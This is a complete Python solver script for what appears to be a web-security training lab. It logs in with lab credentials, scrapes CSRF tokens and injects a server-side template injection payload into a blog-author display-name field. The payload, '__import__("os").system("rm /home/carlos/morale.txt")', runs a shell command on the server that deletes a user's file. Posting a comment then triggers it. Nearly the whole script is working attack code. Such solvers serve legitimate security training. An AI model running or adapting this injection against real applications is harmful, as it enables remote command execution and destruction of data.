import requests
import re
import sys


class Solver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.csrf = None

    def getting_csrf(self):
        response = self.session.get(self.lab_url + 'login')
        self.csrf = re.search('value="(.*)"', response.text).group(1)

    def signing_in(self):
        data = {
            'csrf': self.csrf,
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def injecting_the_payload(self):
        response = self.session.get(self.lab_url + 'my-account')
        self.csrf = re.search('name="csrf" value="(.*)"', response.text).group(1)

        data = {
            'csrf': self.csrf,
            'blog-post-author-display': '__import__("os").system("rm /home/carlos/morale.txt")'
        }
        self.session.post(self.lab_url + 'my-account/change-blog-post-author-display', data=data)

    def posting_a_comment(self):
        data = {
            'csrf': self.csrf,
            'postId': '2',
            'comment': 'hacker'
        }
        self.session.post(self.lab_url + 'post/comment', data=data)
        self.session.get(self.lab_url + 'post?postId=2')

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.getting_csrf()
        self.signing_in()
        self.injecting_the_payload()
        self.posting_a_comment()
        self.checking_solution()


solver = Solver(sys.argv[1])
solver.start()
